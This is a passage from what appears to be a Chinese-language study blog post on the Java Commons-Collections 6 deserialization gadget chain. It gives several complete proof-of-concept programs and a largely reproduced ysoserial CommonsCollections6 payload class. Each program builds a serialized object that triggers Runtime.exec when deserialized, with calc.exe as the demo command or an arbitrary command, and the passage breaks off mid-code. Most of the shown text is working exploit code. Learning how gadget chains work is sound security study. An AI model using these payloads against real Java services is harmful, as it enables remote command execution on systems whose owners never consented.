class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;test&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;jmx0hxq&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; tiedlazy = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        tiedlazy.put(tiedMapEntry,<span class="string">&quot;cc6&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;jmx0hxq&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymap.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"> </span><br><span class="line">        serialize(tiedlazy);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>chian:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">TiedMapEntry.hashCode()</span><br><span class="line">TiedMapEntry.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure></p>
<h3 id="p神文章分析"><a href="#p神文章分析" class="headerlink" title="p神文章分析"></a>p神文章分析</h3><p>p神利用的HashMap的readObject()方法里面的hash()方法来代替了HashMap的put()-&gt;HashMap的hash()<br>链子:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.util.HashMap.readObject()-&gt;</span><br><span class="line">java.util.HashMap.hash()-&gt;</span><br><span class="line">TiedMapEntry.hashCode()-&gt;</span><br><span class="line">TiedMapEntry.getValue()-&gt;</span><br><span class="line">LazyMap.get()-&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="p牛poc-和上面poc1原理一样"><a href="#p牛poc-和上面poc1原理一样" class="headerlink" title="p牛poc,和上面poc1原理一样:"></a>p牛poc,和上面poc1原理一样:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span></span><br><span class="line">                ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="hashSet入口"><a href="#hashSet入口" class="headerlink" title="hashSet入口"></a>hashSet入口</h3><p>HashSet的readObject()方法会调用map.put()方法,从而调用HashMap.put()方法<br>因为HashSet存储不允许有重复元素的集合,底层原理是用HashMap实现的,每个集合的元素都有对应的key值<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507135225.png" alt=""></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">study1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(key);</span><br><span class="line">        decorate.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc6.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashSet);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc6.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="不删key的poc"><a href="#不删key的poc" class="headerlink" title="不删key的poc"></a>不删key的poc</h3><p>把TiedMapEntry 构造方法中的<code>lazyMap</code> 对象替换成一个普通的Map 类，这里使用的是HashMap 类。防止他调用lazyMap的get()方法把key写进去</p>
<p>写完HashMap后最后再通过反射把TiedMapEntry 中的map 字段的值修改回lazyMap 对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.study;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">study1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map lazyMap=  LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),<span class="string">&quot;jmx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry,<span class="string">&quot;jmx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> entry.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(entry,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC6&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;CC6&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ysoserial的poc"><a href="#ysoserial的poc" class="headerlink" title="ysoserial的poc"></a>ysoserial的poc</h3><p>这里yso的链子比较设计hashmap和hashset的底层代码</p>
<p>先取HaseSet的map变量,它是个HashMap类型的,然后取它的table变量,是个Node类型,Node是HashMap的一个静态类<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240507144517.png" alt="image.png"></p>
<p>获取这个table的第一个或者第二个元素,把他的key换成恶意的<code>TiedMapEntry</code>对象<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MATTHIASKAISER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Serializable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Serializable <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        